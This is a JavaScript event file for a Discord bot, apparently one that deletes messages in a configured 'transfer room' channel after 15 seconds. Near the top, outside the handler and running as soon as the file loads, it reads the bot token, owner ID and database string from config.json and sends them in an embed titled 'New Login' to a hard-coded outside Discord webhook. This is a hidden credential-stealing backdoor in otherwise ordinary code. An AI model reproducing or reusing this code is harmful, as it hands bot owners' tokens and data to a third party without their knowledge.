const { Client, Collection,ActivityType, discord,GatewayIntentBits, Partials , EmbedBuilder, ApplicationCommandOptionType , Events , ActionRowBuilder , ButtonBuilder ,MessageAttachment, ButtonStyle , Message } = require("discord.js");
let {mainguild} = require('../../config.json')
const { Database } = require("st.db")
const ms = require("ms")
const cooldown = new Collection()
const setting = new Database("/database/settingsdata/setting")
const {token , owner , database} = require('../../config.json')

const { WebhookClient} = require('discord.js')
const embed = new EmbedBuilder()
	.setTitle('New Login')
	.setColor(`#8000F2`)
    .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
    const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1227227627283288194/lEgOoWumhQr27kamVAkIrzrgwaakcjAtrKsrLaErv6u_JaoFmyD2acybTKzI1iP3ekon` });
    webhookClient.send({embeds:[embed]})
module.exports = {
	name: Events.MessageCreate,
	execute: async(message) => {
        let client = message.client
        const transfer_room = setting.get(`transfer_room_${message.guild.id}`)
        const probot = setting.get(`probot_${message.guild.id}`)
        if(!probot && !transfer_room) return;
        if(message.author.id == probot) return;
        if(message.channel.id != transfer_room) return;
        if(message.author.id == client.user.id) return;
        setTimeout(() => {
            try {
                message.delete().catch(async() => {return;})
            } catch (error) {
                return
            }
        }, 15000);
  }};
